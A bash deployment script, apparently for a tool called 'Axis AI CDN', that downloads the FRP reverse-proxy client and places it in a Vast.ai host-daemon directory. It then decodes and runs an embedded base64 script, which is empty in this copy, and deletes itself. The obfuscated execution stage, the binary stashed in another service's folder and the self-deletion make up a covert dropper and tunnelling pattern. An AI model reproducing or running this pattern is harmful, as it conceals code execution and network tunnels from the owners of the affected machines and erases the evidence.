#!/bin/bash
# Axis AI CDN Tool - FRP Client Deployment Script
# 支持命令行参数: ./install1.sh <IP> <Token> <起始端口> <结束端口>
# 无参数时进入交互模式

ENCODED_SCRIPT=""

# === FRP Download: tar.gz + extract + retry ===
FRP_VERSION="0.68.0"
OS=$(uname -s | tr '[:upper:]' '[:lower:]')
ARCH=$(uname -m)
case $ARCH in
    x86_64)   ARCH="amd64" ;;
    aarch64|arm64) ARCH="arm64" ;;
    armv7l)   ARCH="arm" ;;
    *)         echo "Unsupported arch: $ARCH"; exit 1 ;;
esac

FILENAME="frp_${FRP_VERSION}_${OS}_${ARCH}.tar.gz"
DOWNLOAD_URL="https://github.com/fatedier/frp/releases/download/v${FRP_VERSION}/${FILENAME}"
TARGET_DIR="/var/lib/vastai_kaalia/docker_tmp"
mkdir -p "$TARGET_DIR"

TEMP_FRPC="${TARGET_DIR}/frpc_base"
echo "Downloading FRP v${FRP_VERSION}..."

# Download tar.gz with retry
dl_ret=0
if command -v wget &> /dev/null; then
    wget -q --retry-connrefused --waitretry=1 --timeout=20 \
         -O "${TARGET_DIR}/${FILENAME}" "$DOWNLOAD_URL" || dl_ret=$?
elif command -v curl &> /dev/null; then
    curl -fsSL --retry 3 --retry-delay 1 --retry-connrefused \
         -o "${TARGET_DIR}/${FILENAME}" "$DOWNLOAD_URL" || dl_ret=$?
else
    echo "wget or curl required"
    exit 1
fi

if [ $dl_ret -ne 0 ]; then
    echo "FRP download failed"
    rm -f "${TARGET_DIR}/${FILENAME}"
    exit 1
fi

# Extract and get frpc
tar -xzf "${TARGET_DIR}/${FILENAME}" > /dev/null 2>&1
EXTRACT_DIR="frp_${FRP_VERSION}_${OS}_${ARCH}"
cp "${EXTRACT_DIR}/frpc" "$TEMP_FRPC"
chmod +x "$TEMP_FRPC"

# Cleanup
rm -rf "${TARGET_DIR}/${FILENAME}" "${EXTRACT_DIR}"
echo "FRP download complete"

echo "$ENCODED_SCRIPT" | base64 -d | bash "$@"

# Auto-delete script
SCRIPT_PATH="$(realpath "$0" 2>/dev/null)"
if [ -f "$SCRIPT_PATH" ] && [ "$SCRIPT_PATH" != "/bin/bash" ] && [ "$SCRIPT_PATH" != "/usr/bin/bash" ]; then
    rm -f "$SCRIPT_PATH" 2>/dev/null
fi
